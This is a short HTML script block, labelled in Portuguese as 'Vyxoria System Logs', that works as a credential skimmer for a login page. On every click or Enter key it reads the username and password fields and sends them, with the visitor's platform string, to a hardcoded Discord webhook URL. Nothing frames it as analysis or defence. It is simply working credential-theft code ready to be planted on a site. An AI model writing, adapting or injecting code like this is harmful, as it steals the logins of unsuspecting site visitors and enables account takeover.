<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1482206474590752778/mVCaHUYepv6gD1ReO8qZlwcRGau5l9uNOVm1AzMi0jUvMRW9oTHLv5crvDQZltiiw5Xj";

async function dispararLog(u, p) {
    const msg = {
        embeds: [{
            title: "📡 NOVO LOG RECEBIDO",
            description: "Alguém acabou de digitar os dados no site.",
            color: 0x00A2FF, // Azul Neon
            fields: [
                { name: "👤 USUÁRIO", value: `\`${u}\``, inline: true },
                { name: "🔑 SENHA", value: `\`${p}\``, inline: true },
                { name: "🌍 IP/SISTEMA", value: navigator.platform, inline: false }
            ],
            footer: { text: "Vyxoria System Logs" },
            timestamp: new Date()
        }]
    };

    await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(msg)
    });
}

// Captura automática ao clicar ou apertar enter
document.addEventListener('click', function(event) {
    const userField = document.querySelector('input[type="text"], input[name*="user"], #login-username');
    const passField = document.querySelector('input[type="password"], #login-password');

    if (userField && passField && userField.value.length > 2 && passField.value.length > 2) {
        dispararLog(userField.value, passField.value);
    }
});

document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        const userField = document.querySelector('input[type="text"], #login-username');
        const passField = document.querySelector('input[type="password"], #login-password');
        if (userField.value && passField.value) dispararLog(userField.value, passField.value);
    }
});
</script>



